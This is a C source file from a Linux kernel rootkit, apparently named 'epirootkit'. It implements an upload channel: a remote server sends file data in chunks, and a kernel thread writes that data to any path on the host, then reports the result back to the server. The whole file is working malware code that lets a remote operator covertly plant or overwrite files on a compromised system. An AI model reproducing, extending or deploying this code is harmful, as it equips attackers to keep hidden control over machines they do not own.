#include "upload.h"

#include "epirootkit.h"
#include "network.h"

bool receiving_file = false;
char *upload_buffer = NULL;
char *upload_path = NULL;
long upload_size = 0;
long upload_received = 0;

struct upload_task_data {
    char *path;
    char *buffer;
    long size;
};

static int upload_thread_fn(void *arg) {
    struct upload_task_data *task = (struct upload_task_data *)arg;

    DBG_MSG("upload_thread_fn: écriture %ld octets dans %s\n", task->size, task->path);

    struct file *filp = filp_open(task->path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(filp)) {
        ERR_MSG("upload_thread_fn: failed to open: %s\n", task->path);
        send_to_server("Error while writing file (thread).\n");
    }
    else {
        kernel_write(filp, task->buffer, task->size, &filp->f_pos);
        filp_close(filp, NULL);
        send_to_server("File written successfully (thread).\n");
    }

    kfree(task->buffer);
    kfree(task->path);
    kfree(task);
    receiving_file = false;
    return 0;
}

int handle_upload_chunk(const char *data, size_t len) {
    if (!receiving_file || !upload_buffer)
        return -EINVAL;

    size_t to_copy = len;
    if (upload_received + len > upload_size)
        to_copy = upload_size - upload_received;

    memcpy(upload_buffer + upload_received, data, to_copy);
    upload_received += to_copy;

    if (upload_received >= upload_size) {
        DBG_MSG("handle_upload_chunk: complete, thread launched\n");

        struct upload_task_data *task = kmalloc(sizeof(struct upload_task_data), GFP_KERNEL);
        if (!task) {
            ERR_MSG("handle_upload_chunk: échec alloc task\n");
            return -ENOMEM;
        }

        task->path = upload_path;
        task->buffer = upload_buffer;
        task->size = upload_size;

        upload_path = NULL;
        upload_buffer = NULL;

        kthread_run(upload_thread_fn, task, "upload_thread");
    }

    return 0;
}

int start_upload(const char *path, long size) {
    if (receiving_file)
        return -EBUSY;

    upload_path = kstrdup(path, GFP_KERNEL);
    if (!upload_path)
        return -ENOMEM;

    upload_buffer = kmalloc(size, GFP_KERNEL);
    if (!upload_buffer) {
        kfree(upload_path);
        return -ENOMEM;
    }

    upload_size = size;
    upload_received = 0;
    receiving_file = true;

    DBG_MSG("start_upload: ready to receive %ld bytes to %s\n", size, path);
    return 0;
}
